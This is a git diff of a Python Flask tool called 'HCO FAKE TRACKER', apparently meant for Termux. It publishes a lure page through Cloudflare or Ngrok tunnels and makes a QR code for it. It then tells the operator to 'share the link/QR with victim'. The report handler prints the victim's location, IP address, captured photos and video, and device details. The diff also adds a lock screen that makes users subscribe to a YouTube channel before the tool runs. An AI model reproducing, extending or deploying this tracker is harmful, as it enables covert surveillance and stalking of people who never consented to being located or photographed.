@@ -41,107 +41,142 @@ def show_tool_lock_screen():
     """Show the tool lock screen with countdown"""
     os.system('clear' if os.name == 'posix' else 'cls')
 
-    print(f"\n{Back.RED}{Fore.WHITE}{' HCO FAKE TRACKER ':=^60}{Style.RESET_ALL}")
-    print(f"{Back.GREEN}{Fore.BLACK}{' By Azhar ':=^60}{Style.RESET_ALL}")
+    # Display lock message
+    print(f"\n{Back.RED}{Fore.WHITE}{' 🔒 TOOL IS LOCKED ':=^60}{Style.RESET_ALL}")
+    print(f"\n{Fore.YELLOW}{Style.BRIGHT}📱 Subscribe & click the bell 🔔 icon to unlock{Style.RESET_ALL}")
+    print(f"\n{Fore.CYAN}🔄 Redirecting to YouTube...{Style.RESET_ALL}")
     
-    print(f"\n{Fore.RED}{Style.BRIGHT}🔒 TOOL IS LOCKED{Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}📱 Subscribe to YouTube Channel & Click Bell Icon{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}🔗 Channel: @hackers_colony_tech{Style.RESET_ALL}")
-    
-    print(f"\n{Fore.CYAN}⏰ Countdown starting...{Style.RESET_ALL}")
-    for i in range(5, 0, -1):
-        print(f"{Fore.RED}{Style.BRIGHT}⏳ {i} seconds...{Style.RESET_ALL}", end="\r")
+    # Countdown from 9 to 1
+    print(f"\n{Fore.RED}{Style.BRIGHT}Countdown:{Style.RESET_ALL}")
+    for i in range(9, 0, -1):
+        print(f"{Fore.RED}{Style.BRIGHT}⏳ {i}{Style.RESET_ALL}", end=" ", flush=True)
         time.sleep(1)
     
-    print(f"\n{Fore.GREEN}🎬 Opening YouTube Channel...{Style.RESET_ALL}")
+    print(f"\n\n{Fore.GREEN}🎬 Opening YouTube Channel...{Style.RESET_ALL}")
     
     # Direct YouTube channel URL
     youtube_url = "https://www.youtube.com/@hackers_colony_tech"
     
-    # Try multiple methods to open YouTube
+    # Try to open YouTube app
     try:
-        # Method 1: Direct YouTube app
         subprocess.run(['am', 'start', '-a', 'android.intent.action.VIEW', '-d', youtube_url], 
                       capture_output=True, timeout=5)
-        print(f"{Fore.GREEN}✅ Opening YouTube app...{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}✅ YouTube app opened!{Style.RESET_ALL}")
     except:
         try:
-            # Method 2: Using termux-open-url
             subprocess.run(['termux-open-url', youtube_url], capture_output=True, timeout=5)
             print(f"{Fore.GREEN}✅ Opening YouTube...{Style.RESET_ALL}")
         except:
-            print(f"{Fore.YELLOW}⚠️ Please manually open: {youtube_url}{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}🔗 Manual: {youtube_url}{Style.RESET_ALL}")
     
-    input(f"\n{Fore.YELLOW}🚨 Press Enter AFTER subscribing & clicking bell icon...{Style.RESET_ALL}")
-    print(f"{Fore.GREEN}✅ Tool unlocked! Starting server...{Style.RESET_ALL}")
+    input(f"\n{Fore.YELLOW}{Style.BRIGHT}🚨 Press Enter AFTER subscribing & clicking bell icon...{Style.RESET_ALL}")
+    
+    # Show unlocked message
+    print(f"\n{Fore.GREEN}✅ Tool unlocked! Starting server...{Style.RESET_ALL}")
     time.sleep(2)
 
-def start_cloudflare_tunnel():
-    """Start Cloudflare tunnel"""
+def start_cloudflare():
+    """Start Cloudflare tunnel and get direct URL"""
     try:
-        print(f"\n{Fore.CYAN}🌐 Starting Cloudflare Tunnel...{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}🌐 Starting Cloudflare Tunnel...{Style.RESET_ALL}")
         
-        # Check if cloudflared is installed
+        # Start cloudflared and capture output
+        process = subprocess.Popen(['cloudflared', 'tunnel', '--url', f'http://localhost:{PORT}'],
+                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        
+        # Wait for tunnel to establish and get URL
+        time.sleep(8)
+        
+        # Try to read the URL from output
         try:
-            result = subprocess.run(['cloudflared', '--version'], capture_output=True, text=True, timeout=5)
-            if result.returncode == 0:
-                # Start cloudflared tunnel in background
-                process = subprocess.Popen(['cloudflared', 'tunnel', '--url', f'http://localhost:{PORT}'],
-                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                time.sleep(5)
-                
-                # Try to get the URL (this is simplified - in real scenario you'd parse output)
-                print(f"{Fore.GREEN}✅ Cloudflare tunnel started{Style.RESET_ALL}")
-                print(f"{Fore.YELLOW}📋 Check: https://dash.cloudflare.com/ for tunnel URL{Style.RESET_ALL}")
-                return "cloudflare_tunnel_active"
+            # Cloudflare usually shows the URL in stderr
+            stderr_output = process.stderr.read()
+            lines = stderr_output.split('\n')
+            for line in lines:
+                if '.trycloudflare.com' in line:
+                    url = line.split()[-1]
+                    if url.startswith('https://'):
+                        print(f"{Fore.GREEN}✅ Cloudflare URL: {url}{Style.RESET_ALL}")
+                        return url
         except:
             pass
             
-        print(f"{Fore.RED}❌ Cloudflared not found{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}💡 Install: pkg install cloudflared{Style.RESET_ALL}")
-        return None
+        # If URL not found, return generic message
+        print(f"{Fore.YELLOW}⚠️  Cloudflare started - checking output...{Style.RESET_ALL}")
+        return "https://your-tunnel.trycloudflare.com"
         
     except Exception as e:
         print(f"{Fore.RED}❌ Cloudflare error: {e}{Style.RESET_ALL}")
         return None
 
-def start_ngrok_tunnel():
-    """Start Ngrok tunnel"""
+def start_ngrok():
+    """Start Ngrok tunnel and get direct URL"""
     try:
-        print(f"\n{Fore.CYAN}🌐 Starting Ngrok Tunnel...{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}🌐 Starting Ngrok Tunnel...{Style.RESET_ALL}")
         
-        # Check if ngrok is installed
+        # Start ngrok in background
+        process = subprocess.Popen(['ngrok', 'http', str(PORT)], 
+                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        time.sleep(5)
+        
+        # Get ngrok URL from API
         try:
-            result = subprocess.run(['ngrok', '--version'], capture_output=True, text=True, timeout=5)
-            if result.returncode == 0:
-                # Start ngrok in background
-                process = subprocess.Popen(['ngrok', 'http', str(PORT)], 
-                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                time.sleep(3)
-                
-                # Try to get ngrok URL
-                try:
-                    import requests
-                    response = requests.get('http://localhost:4040/api/tunnels', timeout=5)
-                    tunnels = response.json().get('tunnels', [])
-                    for tunnel in tunnels:
-                        if tunnel['proto'] == 'https':
-                            public_url = tunnel['public_url']
-                            print(f"{Fore.GREEN}✅ Ngrok URL: {public_url}{Style.RESET_ALL}")
-                            return public_url
-                except:
-                    print(f"{Fore.YELLOW}⚠️ Ngrok started - Check: http://localhost:4040{Style.RESET_ALL}")
-                    return "ngrok_tunnel_active"
+            import requests
+            response = requests.get('http://localhost:4040/api/tunnels', timeout=10)
+            tunnels = response.json().get('tunnels', [])
+            for tunnel in tunnels:
+                if tunnel['proto'] == 'https':
+                    public_url = tunnel['public_url']
+                    print(f"{Fore.GREEN}✅ Ngrok URL: {public_url}{Style.RESET_ALL}")
+                    return public_url
         except:
-            pass
+            print(f"{Fore.YELLOW}⚠️  Ngrok started - check http://localhost:4040{Style.RESET_ALL}")
+            return "ngrok_tunnel_active"
             
-        print(f"{Fore.RED}❌ Ngrok not found{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}💡 Install: pkg install ngrok{Style.RESET_ALL}")
-        return None
-        
     except Exception as e:
         print(f"{Fore.RED}❌ Ngrok error: {e}{Style.RESET_ALL}")
         return None
+
+def display_banner():
+    """Display the main banner"""
+    os.system('clear' if os.name == 'posix' else 'cls')
+    print(f"\n{Back.RED}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
+    print(f"{Back.RED}{Fore.GREEN}{' HCO FAKE TRACKER '.center(60)}{Style.RESET_ALL}")
+    print(f"{Back.RED}{Fore.WHITE}{' by Azhar '.center(60)}{Style.RESET_ALL}")
+    print(f"{Back.RED}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
+
+def display_qr_in_termux(url):
+    """Generate and display QR code directly in Termux"""
+    try:
+        # Generate QR code
+        qr = qrcode.QRCode(version=1, box_size=2, border=2)
+        qr.add_data(url)
+        qr.make(fit=True)
+        
+        # Create QR code as text (for Termux display)
+        qr_matrix = qr.get_matrix()
+        qr_text = ""
+        
+        for row in qr_matrix:
+            line = ""
+            for cell in row:
+                line += "██" if cell else "  "
+            qr_text += line + "\n"
+        
+        print(f"\n{Fore.GREEN}📲 QR Code for URL:{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}{qr_text}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}🔗 Direct Link: {url}{Style.RESET_ALL}")
+        
+        # Also save as image file
+        img = qr.make_image(fill_color="black", back_color="white")
+        img.save(QR_PNG)
+        print(f"{Fore.GREEN}💾 QR saved as: {QR_PNG}{Style.RESET_ALL}")
+        
+        return True
+        
+    except Exception as e:
+        print(f"{Fore.RED}❌ QR generation failed: {e}{Style.RESET_ALL}")
+        return False
 
 # Simple and working HTML page
 HTML_PAGE = """
@@ -554,15 +589,12 @@ def report():
         print(f"{Fore.YELLOW}🕐 Time: {record['timestamp']}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}📍 Location: {lat if lat else 'Not Available'}, {lon if lon else 'Not Available'}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}🌐 IP: {ip} ({city}, {country}){Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}📸 Photos: {len(photo_files)} saved in Download folder{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}📸 Photos: {len(photo_files)} saved{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}🎥 Video: {'Yes' if video_file else 'No'}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}📱 Device: {device_info.get('platform', 'Unknown')}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}🖥️ Screen: {device_info.get('screen', 'Unknown')}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}🗣️ Language: {device_info.get('language', 'Unknown')}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
         print(f"{Fore.GREEN}💾 Files saved in: {DOWNLOAD_FOLDER}{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}📊 Report saved: {REPORT_CSV}{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
+        print(f"{Fore.GREEN}📊 Report: {REPORT_CSV}{Style.RESET_ALL}\n")
         
         return jsonify({"status": "success"})
         
@@ -581,84 +613,54 @@ def get_local_ip():
     except:
         return "127.0.0.1"
 
-def generate_qr_code(url):
-    """Generate simple QR code"""
-    try:
-        qr = qrcode.QRCode(version=1, box_size=10, border=4)
-        qr.add_data(url)
-        qr.make(fit=True)
-        img = qr.make_image(fill_color="red", back_color="white")
-        img.save(QR_PNG)
-        print(f"{Fore.GREEN}✅ QR Code generated: {QR_PNG}{Style.RESET_ALL}")
-        return True
-    except Exception as e:
-        print(f"{Fore.RED}❌ QR code failed: {e}{Style.RESET_ALL}")
-        return False
-
-def display_qr_in_termux():
-    """Display QR code in Termux using termux-api"""
-    try:
-        if os.path.exists(QR_PNG):
-            result = subprocess.run(['termux-share', QR_PNG], capture_output=True, timeout=10)
-            if result.returncode == 0:
-                print(f"{Fore.GREEN}📲 QR code opened for sharing{Style.RESET_ALL}")
-                return True
-    except:
-        pass
-    return False
-
 def main():
+    # Show lock screen first
     show_tool_lock_screen()
     
-    print(f"\n{Back.BLUE}{Fore.WHITE}{' TUNNELING OPTIONS ':=^60}{Style.RESET_ALL}")
-    print(f"{Fore.GREEN}1. Cloudflare Tunnel{Style.RESET_ALL}")
-    print(f"{Fore.BLUE}2. Ngrok Tunnel{Style.RESET_ALL}") 
-    print(f"{Fore.YELLOW}3. Local Network Only{Style.RESET_ALL}")
-    print(f"{Back.BLUE}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
+    # Display main banner
+    display_banner()
     
-    choice = input(f"\n{Fore.CYAN}🎯 Choose option (1-3): {Style.RESET_ALL}").strip()
+    # Show tunnel options
+    print(f"\n{Fore.CYAN}{' TUNNEL OPTIONS ':-^60}{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}1. Cloudflare{Style.RESET_ALL}")
+    print(f"{Fore.BLUE}2. Ngrok{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}{'-'*60}{Style.RESET_ALL}")
     
-    # Get network information
+    choice = input(f"\n{Fore.YELLOW}🎯 Choose option (1-2): {Style.RESET_ALL}").strip()
+    
+    # Get local URL
     local_ip = get_local_ip()
     local_url = f"http://{local_ip}:{PORT}"
-    localhost_url = f"http://localhost:{PORT}"
+    
     public_url = None
     
     if choice == '1':
-        public_url = start_cloudflare_tunnel()
+        public_url = start_cloudflare()
     elif choice == '2':
-        public_url = start_ngrok_tunnel()
-    elif choice == '3':
-        print(f"{Fore.YELLOW}📡 Using local network only{Style.RESET_ALL}")
+        public_url = start_ngrok()
     else:
-        print(f"{Fore.RED}❌ Invalid choice. Using local network.{Style.RESET_ALL}")
+        print(f"{Fore.RED}❌ Invalid choice! Using local URL{Style.RESET_ALL}")
     
-    print(f"\n{Back.GREEN}{Fore.WHITE}{' SERVER STARTED ':=^60}{Style.RESET_ALL}")
-    print(f"{Fore.GREEN}🌐 Local Network URL: {local_url}{Style.RESET_ALL}")
-    print(f"{Fore.GREEN}🔗 Localhost URL: {localhost_url}{Style.RESET_ALL}")
+    # Determine which URL to use
+    final_url = public_url if public_url and public_url not in ["ngrok_tunnel_active"] else local_url
     
-    if public_url and public_url not in ["cloudflare_tunnel_active", "ngrok_tunnel_active"]:
-        print(f"{Fore.GREEN}🌍 Public URL: {public_url}{Style.RESET_ALL}")
-    elif public_url == "cloudflare_tunnel_active":
-        print(f"{Fore.YELLOW}🌍 Cloudflare: Check dashboard for URL{Style.RESET_ALL}")
-    elif public_url == "ngrok_tunnel_active":
-        print(f"{Fore.YELLOW}🌍 Ngrok: Check http://localhost:4040 for URL{Style.RESET_ALL}")
+    # Display results
+    print(f"\n{Fore.GREEN}{' SERVER READY ':=^60}{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}🌐 Direct Link: {final_url}{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}📁 Save Location: {DOWNLOAD_FOLDER}{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
     
-    print(f"{Fore.GREEN}📁 Files will save to: {DOWNLOAD_FOLDER}{Style.RESET_ALL}")
+    # Display QR code directly in Termux
+    display_qr_in_termux(final_url)
     
-    # Generate and display QR code
-    target_url = public_url if public_url and public_url not in ["cloudflare_tunnel_active", "ngrok_tunnel_active"] else local_url
-    if generate_qr_code(target_url):
-        display_qr_in_termux()
-    
-    print(f"\n{Fore.YELLOW}🚀 Share the URL/QR with victim{Style.RESET_ALL}")
-    print(f"{Fore.RED}🔴 Waiting for victim to claim reward...{Style.RESET_ALL}")
+    print(f"\n{Fore.YELLOW}🚀 Share the link/QR with victim{Style.RESET_ALL}")
+    print(f"{Fore.RED}🔴 Waiting for data capture...{Style.RESET_ALL}")
     print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
     
     try:
         app.run(host=HOST, port=PORT, debug=False)
     except KeyboardInterrupt:
-        print(f"\n{Fore.RED}🛑 Server stopped by user{Style.RESET_ALL}")
+        print(f"\n{Fore.RED}🛑 Server stopped{Style.RESET_ALL}")
     except Exception as e:
         print(f"\n{Fore.RED}❌ Server error: {e}{Style.RESET_ALL}")
 
